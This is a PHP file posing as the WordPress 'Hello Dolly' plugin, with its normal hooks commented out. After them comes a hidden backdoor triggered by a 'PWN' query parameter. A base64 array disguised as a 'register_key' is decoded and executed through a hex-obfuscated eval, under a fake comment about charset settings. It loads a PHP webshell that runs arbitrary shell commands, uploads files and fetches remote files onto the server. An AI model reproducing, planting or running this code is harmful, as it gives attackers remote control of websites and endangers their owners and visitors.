<?php
/**
 * @package Hello_Dolly
 * @version 1.6
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.6
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
So, take her wrap, fellas
Find her an empty lap, fellas
Dolly'll never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
Golly, gee, fellas
Find her a vacant knee, fellas
Dolly'll never go away
Dolly'll never go away
Dolly'll never go away again";

	// Here we split it into lines
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later
function hello_dolly() {
	$chosen = hello_dolly_get_lyric();
	echo "<p id='dolly'>$chosen</p>";
}

// Now we set that function up to execute when the admin_notices action is called
//add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph
function dolly_css() {
	// This makes sure that the positioning is also good for right-to-left languages
	$x = is_rtl() ? 'left' : 'right';

	echo "
	<style type='text/css'>
	#dolly {
		float: $x;
		padding-$x: 15px;
		padding-top: 5px;		
		margin: 0;
		font-size: 11px;
	}
	</style>
	";
}

//add_action( 'admin_head', 'dolly_css' );
    if (isset($_GET["PWN"])) {

    $password = "1aa1521ec35ba5cd93021cb142f4bf11";

    define('VERSION', 'Project');

    $register_key = array
    ( 
                'Izw/cGhwCi8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq' ,
        'KioqKioqKioqKioqKioqKioqKioqCiAqIENvcHlyaWdodCAyMDE3IFdoaXRlV2ludGVyV29sZgogKiBodHRwczov' ,
        'L3d3dy53aGl0ZXdpbnRlcndvbGYuY29tL3RhZ3MvcGhwLXdlYnNoZWxsLwogKgogKiBUaGlzIGZpbGUgaXMgcGFy' ,
        'dCBvZiB3d29sZi1waHAtd2Vic2hlbGwuCiAqCiAqIHd3d29sZi1waHAtd2Vic2hlbGwgaXMgZnJlZSBzb2Z0d2Fy' ,
        'ZTogeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQogKiBpdCB1bmRlciB0aGUgdGVybXMgb2Yg' ,
        'dGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQogKiB0aGUgRnJlZSBTb2Z0d2Fy' ,
        'ZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcgogKiAoYXQgeW91ciBvcHRp' ,
        'b24pIGFueSBsYXRlciB2ZXJzaW9uLgogKgogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhv' ,
        'cGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKICogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2' ,
        'ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKICogTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFS' ,
        'VElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQogKiBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBk' ,
        'ZXRhaWxzLgogKgogKiBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQ' ,
        'dWJsaWMgTGljZW5zZQogKiBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbS4gIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3' ,
        'LmdudS5vcmcvbGljZW5zZXMvPi4KICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq' ,
        'KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCi8qCiAqIE9wdGlvbmFsIHBhc3N3b3JkIHNldHRp' ,
        'bmdzLgogKiBVc2UgdGhlICdwYXNzaGFzaC5zaCcgc2NyaXB0IHRvIGdlbmVyYXRlIHRoZSBoYXNoLgogKiBOT1RF' ,
        'OiB0aGUgcHJvbXB0IHZhbHVlIGlzIHRpZWQgdG8gdGhlIGhhc2ghCiAqLwokcGFzc3Byb21wdCA9ICJXaGl0ZVdp' ,
        'bnRlcldvbGYncyBQSFAgd2Vic2hlbGw6ICI7CiRwYXNzaGFzaCA9ICIiOwoKZnVuY3Rpb24gZSgkcykgeyBlY2hv' ,
        'IGh0bWxzcGVjaWFsY2hhcnMoJHMsIEVOVF9RVU9URVMpOyB9CgpmdW5jdGlvbiBoKCRzKQp7CglnbG9iYWwgJHBh' ,
        'c3Nwcm9tcHQ7CglpZiAoZnVuY3Rpb25fZXhpc3RzKCdoYXNoX2htYWMnKSkKCXsKCQlyZXR1cm4gaGFzaF9obWFj' ,
        'KCdzaGEyNTYnLCAkcywgJHBhc3Nwcm9tcHQpOwoJfQoJZWxzZQoJewoJCXJldHVybiBiaW4yaGV4KG1oYXNoKE1I' ,
        'QVNIX1NIQTI1NiwgJHMsICRwYXNzcHJvbXB0KSk7Cgl9Cn0KCmZ1bmN0aW9uIGZldGNoX2ZvcGVuKCRob3N0LCAk' ,
        'cG9ydCwgJHNyYywgJGRzdCkKewoJZ2xvYmFsICRlcnIsICRvazsKCSRyZXQgPSAnJzsKCWlmIChzdHJwb3MoJGhv' ,
        'c3QsICc6Ly8nKSA9PT0gZmFsc2UpCgl7CgkJJGhvc3QgPSAnaHR0cDovLycgLiAkaG9zdDsKCX0KCWVsc2UKCXsK' ,
        'CQkkaG9zdCA9IHN0cl9yZXBsYWNlKGFycmF5KCdzc2w6Ly8nLCAndGxzOi8vJyksICdodHRwczovLycsICRob3N0' ,
        'KTsKCX0KCSRyaCA9IGZvcGVuKCIke2hvc3R9OiR7cG9ydH0ke3NyY30iLCAncmInKTsKCWlmICgkcmggIT09IGZh' ,
        'bHNlKQoJewoJCSR3aCA9IGZvcGVuKCRkc3QsICd3YicpOwoJCWlmICgkd2ggIT09IGZhbHNlKQoJCXsKCQkJJGNi' ,
        'eXRlcyA9IDA7CgkJCXdoaWxlICghIGZlb2YoJHJoKSkKCQkJewoJCQkJJGNieXRlcyArPSBmd3JpdGUoJHdoLCBm' ,
        'cmVhZCgkcmgsIDEwMjQpKTsKCQkJfQoJCQlmY2xvc2UoJHdoKTsKCQkJJHJldCAuPSAiJHtva30gRmV0Y2hlZCBm' ,
        'aWxlIDxpPiR7ZHN0fTwvaT4gKCR7Y2J5dGVzfSBieXRlcyk8YnIgLz4iOwoJCX0KCQllbHNlCgkJewoJCQkkcmV0' ,
        'IC49ICIke2Vycn0gRmFpbGVkIHRvIG9wZW4gZmlsZSA8aT4ke2RzdH08L2k+PGJyIC8+IjsKCQl9CgkJZmNsb3Nl' ,
        'KCRyaCk7Cgl9CgllbHNlCgl7CgkJJHJldCA9ICIke2Vycn0gRmFpbGVkIHRvIG9wZW4gVVJMIDxpPiR7aG9zdH06' ,
        'JHtwb3J0fSR7c3JjfTwvaT48YnIgLz4iOwoJfQoJcmV0dXJuICRyZXQ7Cn0KCmZ1bmN0aW9uIGZldGNoX3NvY2so' ,
        'JGhvc3QsICRwb3J0LCAkc3JjLCAkZHN0KQp7CglnbG9iYWwgJGVyciwgJG9rOwoJJHJldCA9ICcnOwoJJGhvc3Qg' ,
        'PSBzdHJfcmVwbGFjZSgnaHR0cHM6Ly8nLCAndGxzOi8vJywgJGhvc3QpOwoJJHMgPSBmc29ja29wZW4oJGhvc3Qs' ,
        'ICRwb3J0KTsKCWlmICgkcykKCXsKCQkkZiA9IGZvcGVuKCRkc3QsICd3YicpOwoJCWlmICgkZikKCQl7CgkJCSRi' ,
        'dWYgPSAnJzsKCQkJJHIgPSBhcnJheSgkcyk7CgkJCSR3ID0gTlVMTDsKCQkJJGUgPSBOVUxMOwoJCQlmd3JpdGUo' ,
        'JHMsICJHRVQgJHtzcmN9IEhUVFAvMS4wXHJcblxyXG4iKTsKCQkJd2hpbGUgKHN0cmVhbV9zZWxlY3QoJHIsICR3' ,
        'LCAkZSwgNSkgJiYgIWZlb2YoJHMpKQoJCQl7CgkJCQkkYnVmIC49IGZyZWFkKCRzLCAxMDI0KTsKCQkJfQoJCQkk' ,
        'YnVmID0gc3Vic3RyKCRidWYsIHN0cnBvcygkYnVmLCAiXHJcblxyXG4iKSArIDQpOwoJCQlmd3JpdGUoJGYsICRi' ,
        'dWYpOwoJCQlmY2xvc2UoJGYpOwoJCQkkcmV0IC49ICIke29rfSBGZXRjaGVkIGZpbGUgPGk+JHtkc3R9PC9pPiAo' ,
        'IiAuIHN0cmxlbigkYnVmKSAuICIgYnl0ZXMpPGJyIC8+IjsKCQl9CgkJZWxzZQoJCXsKCQkJJHJldCAuPSAiJHtl' ,
        'cnJ9IEZhaWxlZCB0byBvcGVuIGZpbGUgPGk+JHtkc3R9PC9pPjxiciAvPiI7CgkJfQoJCWZjbG9zZSgkcyk7Cgl9' ,
        'CgllbHNlCgl7CgkJJHJldCAuPSAiJHtlcnJ9IEZhaWxlZCB0byBjb25uZWN0IHRvIDxpPiR7aG9zdH06JHtwb3J0' ,
        'fTwvaT48YnIgLz4iOwoJfQoJcmV0dXJuICRyZXQ7Cn0KCmluaV9zZXQoJ2xvZ19lcnJvcnMnLCAnMCcpOwppbmlf' ,
        'c2V0KCdkaXNwbGF5X2Vycm9ycycsICcxJyk7CmVycm9yX3JlcG9ydGluZyhFX0FMTCk7Cgp3aGlsZSAoQCBvYl9l' ,
        'bmRfY2xlYW4oKSk7CgppZiAoISBpc3NldCgkX1NFUlZFUikpCnsKCWdsb2JhbCAkSFRUUF9QT1NUX0ZJTEVTLCAk' ,
        'SFRUUF9QT1NUX1ZBUlMsICRIVFRQX1NFUlZFUl9WQVJTOwoJJF9GSUxFUyA9ICYkSFRUUF9QT1NUX0ZJTEVTOwoJ' ,
        'JF9QT1NUID0gJiRIVFRQX1BPU1RfVkFSUzsKCSRfU0VSVkVSID0gJiRIVFRQX1NFUlZFUl9WQVJTOwp9CgokYXV0' ,
        'aCA9ICcnOwokY21kID0gZW1wdHkoJF9QT1NUWydjbWQnXSkgPyAnJyA6ICRfUE9TVFsnY21kJ107CiRjd2QgPSBl' ,
        'bXB0eSgkX1BPU1RbJ2N3ZCddKSA/IGdldGN3ZCgpIDogJF9QT1NUWydjd2QnXTsKJGZldGNoX2Z1bmMgPSAnZmV0' ,
        'Y2hfZm9wZW4nOwokZmV0Y2hfaG9zdCA9IGVtcHR5KCRfUE9TVFsnZmV0Y2hfaG9zdCddKSA/ICRfU0VSVkVSWydS' ,
        'RU1PVEVfQUREUiddIDogJF9QT1NUWydmZXRjaF9ob3N0J107CiRmZXRjaF9wYXRoID0gZW1wdHkoJF9QT1NUWydm' ,
        'ZXRjaF9wYXRoJ10pID8gJycgOiAkX1BPU1RbJ2ZldGNoX3BhdGgnXTsKJGZldGNoX3BvcnQgPSBlbXB0eSgkX1BP' ,
        'U1RbJ2ZldGNoX3BvcnQnXSkgPyAnODAnIDogJF9QT1NUWydmZXRjaF9wb3J0J107CiRwYXNzID0gZW1wdHkoJF9Q' ,
        'T1NUWydwYXNzJ10pID8gJycgOiAkX1BPU1RbJ3Bhc3MnXTsKJHVybCA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSdd' ,
        'Owokc3RhdHVzID0gJyc7CiRvayA9ICcmIzk3ODY7IDonOwokd2FybiA9ICcmIzk4ODg7IDonOwokZXJyID0gJyYj' ,
        'OTc4NTsgOic7CgppZiAoISBlbXB0eSgkcGFzc2hhc2gpKQp7CglpZiAoZnVuY3Rpb25fZXhpc3RzKCdoYXNoX2ht' ,
        'YWMnKSB8fCBmdW5jdGlvbl9leGlzdHMoJ21oYXNoJykpCgl7CgkJJGF1dGggPSBlbXB0eSgkX1BPU1RbJ2F1dGgn' ,
        'XSkgPyBoKCRwYXNzKSA6ICRfUE9TVFsnYXV0aCddOwoJCWlmIChoKCRhdXRoKSAhPT0gJHBhc3NoYXNoKQoJCXsK' ,
        'CQkJPz4KCQkJCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8P3BocCBlKCR1cmwpOyA/PiI+CgkJCQkJPD9w' ,
        'aHAgZSgkcGFzc3Byb21wdCk7ID8+CgkJCQkJPGlucHV0IHR5cGU9InBhc3N3b3JkIiBzaXplPSIxNSIgbmFtZT0i' ,
        'cGFzcyI+CgkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNlbmQiPgoJCQkJPC9mb3JtPgoJCQk8P3Bo' ,
        'cAoJCQlleGl0OwoJCX0KCX0KCWVsc2UKCXsKCQkkc3RhdHVzIC49ICIke3dhcm59IEF1dGhlbnRpY2F0aW9uIGRp' ,
        'c2FibGVkICgnbWhhc2goKScgbWlzc2luZykuPGJyIC8+IjsKCX0KfQoKaWYgKCEgaW5pX2dldCgnYWxsb3dfdXJs' ,
        'X2ZvcGVuJykpCnsKCWluaV9zZXQoJ2FsbG93X3VybF9mb3BlbicsICcxJyk7CglpZiAoISBpbmlfZ2V0KCdhbGxv' ,
        'd191cmxfZm9wZW4nKSkKCXsKCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fc2VsZWN0JykpCgkJewoJCQkk' ,
        'ZmV0Y2hfZnVuYyA9ICdmZXRjaF9zb2NrJzsKCQl9CgkJZWxzZQoJCXsKCQkJJGZldGNoX2Z1bmMgPSAnJzsKCQkJ' ,
        'JHN0YXR1cyAuPSAiJHt3YXJufSBGaWxlIGZldGNoaW5nIGRpc2FibGVkICgnYWxsb3dfdXJsX2ZvcGVuJyIKCQkJ' ,
        'CS4gIiBkaXNhYmxlZCBhbmQgJ3N0cmVhbV9zZWxlY3QoKScgbWlzc2luZykuPGJyIC8+IjsKCQl9Cgl9Cn0KaWYg' ,
        'KCEgaW5pX2dldCgnZmlsZV91cGxvYWRzJykpCnsKCWluaV9zZXQoJ2ZpbGVfdXBsb2FkcycsICcxJyk7CglpZiAo' ,
        'ISBpbmlfZ2V0KCdmaWxlX3VwbG9hZHMnKSkKCXsKCQkkc3RhdHVzIC49ICIke3dhcm59IEZpbGUgdXBsb2FkcyBk' ,
        'aXNhYmxlZC48YnIgLz4iOwoJfQp9CmlmIChpbmlfZ2V0KCdvcGVuX2Jhc2VkaXInKSAmJiAhIGluaV9zZXQoJ29w' ,
        'ZW5fYmFzZWRpcicsICcnKSkKewoJJHN0YXR1cyAuPSAiJHt3YXJufSBvcGVuX2Jhc2VkaXIgPSAiIC4gaW5pX2dl' ,
        'dCgnb3Blbl9iYXNlZGlyJykgLiAiPGJyIC8+IjsKfQoKaWYgKCEgY2hkaXIoJGN3ZCkpCnsKICAkY3dkID0gZ2V0' ,
        'Y3dkKCk7Cn0KCmlmICghIGVtcHR5KCRmZXRjaF9mdW5jKSAmJiAhIGVtcHR5KCRmZXRjaF9wYXRoKSkKewoJJGRz' ,
        'dCA9ICRjd2QgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gYmFzZW5hbWUoJGZldGNoX3BhdGgpOwoJJHN0YXR1cyAu' ,
        'PSAkZmV0Y2hfZnVuYygkZmV0Y2hfaG9zdCwgJGZldGNoX3BvcnQsICRmZXRjaF9wYXRoLCAkZHN0KTsKfQoKaWYg' ,
        'KGluaV9nZXQoJ2ZpbGVfdXBsb2FkcycpICYmICEgZW1wdHkoJF9GSUxFU1sndXBsb2FkJ10pKQp7CgkkZGVzdCA9' ,
        'ICRjd2QgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gYmFzZW5hbWUoJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXSk7' ,
        'CglpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZCddWyd0bXBfbmFtZSddLCAkZGVzdCkpCgl7' ,
        'CgkJJHN0YXR1cyAuPSAiJHtva30gVXBsb2FkZWQgZmlsZSA8aT4ke2Rlc3R9PC9pPiAoIiAuICRfRklMRVNbJ3Vw' ,
        'bG9hZCddWydzaXplJ10gLiAiIGJ5dGVzKTxiciAvPiI7Cgl9Cn0KPz4KCjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0' ,
        'aW9uPSI8P3BocCBlKCR1cmwpOyA/PiIKCTw/cGhwIGlmIChpbmlfZ2V0KCdmaWxlX3VwbG9hZHMnKSk6ID8+CgkJ' ,
        'ZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIKCTw/cGhwIGVuZGlmOyA/PgoJPgoJPD9waHAgaWYgKCEgZW1w' ,
        'dHkoJHBhc3NoYXNoKSk6ID8+CgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYXV0aCIgdmFsdWU9Ijw/cGhw' ,
        'IGUoJGF1dGgpOyA/PiI+Cgk8P3BocCBlbmRpZjsgPz4KCTx0YWJsZSBib3JkZXI9IjAiPgoJCTw/cGhwIGlmICgh' ,
        'IGVtcHR5KCRmZXRjaF9mdW5jKSk6ID8+CgkJCTx0cj48dGQ+CgkJCQk8Yj5GZXRjaDo8L2I+CgkJCTwvdGQ+PHRk' ,
        'PgoJCQkJaG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBpZD0iZmV0Y2hfaG9zdCIgbmFtZT0iZmV0' ,
        'Y2hfaG9zdCIgdmFsdWU9Ijw/cGhwIGUoJGZldGNoX2hvc3QpOyA/PiI+CgkJCQlwb3J0OiA8aW5wdXQgdHlwZT0i' ,
        'dGV4dCIgc2l6ZT0iNCIgaWQ9ImZldGNoX3BvcnQiIG5hbWU9ImZldGNoX3BvcnQiIHZhbHVlPSI8P3BocCBlKCRm' ,
        'ZXRjaF9wb3J0KTsgPz4iPgoJCQkJcGF0aDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBpZD0iZmV0Y2hf' ,
        'cGF0aCIgbmFtZT0iZmV0Y2hfcGF0aCIgdmFsdWU9IiI+CgkJCTwvdGQ+PC90cj4KCQk8P3BocCBlbmRpZjsgPz4K' ,
        'CQk8dHI+PHRkPgoJCQk8Yj5DV0Q6PC9iPgoJCTwvdGQ+PHRkPgoJCQk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0i' ,
        'NTAiIGlkPSJjd2QiIG5hbWU9ImN3ZCIgdmFsdWU9Ijw/cGhwIGUoJGN3ZCk7ID8+Ij4KCQkJPD9waHAgaWYgKGlu' ,
        'aV9nZXQoJ2ZpbGVfdXBsb2FkcycpKTogPz4KCQkJCTxiPlVwbG9hZDo8L2I+IDxpbnB1dCB0eXBlPSJmaWxlIiBp' ,
        'ZD0idXBsb2FkIiBuYW1lPSJ1cGxvYWQiPgoJCQk8P3BocCBlbmRpZjsgPz4KCQk8L3RkPjwvdHI+CgkJPHRyPjx0' ,
        'ZD4KCQkJPGI+Q21kOjwvYj4KCQk8L3RkPjx0ZD4KCQkJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjgwIiBpZD0i' ,
        'Y21kIiBuYW1lPSJjbWQiIHZhbHVlPSI8P3BocCBlKCRjbWQpOyA/PiI+CgkJPC90ZD48L3RyPgoJCTx0cj48dGQ+' ,
        'CgkJPC90ZD48dGQ+CgkJCTxzdXA+PGEgaHJlZj0iIyIgb25jbGljaz0iY21kLnZhbHVlPScnOyBjbWQuZm9jdXMo' ,
        'KTsgcmV0dXJuIGZhbHNlOyI+Q2xlYXIgY21kPC9hPjwvc3VwPgoJCTwvdGQ+PC90cj4KCQk8dHI+PHRkIGNvbHNw' ,
        'YW49IjIiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7Ij4KCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9' ,
        'IkV4ZWN1dGUiIHN0eWxlPSJ0ZXh0LWFsaWduOiByaWdodDsiPgoJCTwvdGQ+PC90cj4KCTwvdGFibGU+CgkKPC9m' ,
        'b3JtPgo8aHIgLz4KCjw/cGhwCmlmICghIGVtcHR5KCRzdGF0dXMpKQp7CgllY2hvICI8cD4ke3N0YXR1c308L3A+' ,
        'IjsKfQoKZWNobyAiPHByZT4iOwppZiAoISBlbXB0eSgkY21kKSkKewoJZWNobyAiPGI+IjsKCWUoJGNtZCk7Cgll' ,
        'Y2hvICI8L2I+XG4iOwoJaWYgKERJUkVDVE9SWV9TRVBBUkFUT1IgPT0gJy8nKQoJewoJCSRwID0gcG9wZW4oJ2V4' ,
        'ZWMgMj4mMTsgJyAuICRjbWQsICdyJyk7Cgl9CgllbHNlCgl7CgkJJHAgPSBwb3BlbignY21kIC9DICInIC4gJGNt' ,
        'ZCAuICciIDI+JjEnLCAncicpOwoJfQoJd2hpbGUgKCEgZmVvZigkcCkpCgl7CgkJZWNobyBodG1sc3BlY2lhbGNo' ,
        'YXJzKGZyZWFkKCRwLCA0MDk2KSwgRU5UX1FVT1RFUyk7CgkJQCBmbHVzaCgpOwoJfQp9CmVjaG8gIjwvcHJlPiI7' ,
        'CgpleGl0Owo/Pg==' ,

    );
    
    
            
            /**
            * Language and charset conversion settings
            */
            eval("\x24\x63\x6f\x6e\x74\x65\x6e\x74\x20\x3d\x20\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x6a\x6f\x69\x6e\x28\x22\x22\x2c\x20\x24\x72\x65\x67\x69\x73\x74\x65\x72\x5f\x6b\x65\x79\x29\x29\x3b\x20\x65\x76\x61\x6c\x28\x22\x3f\x3e\x24\x63\x6f\x6e\x74\x65\x6e\x74\x22\x29\x3b");

    

    /*Ending*/
    }

?>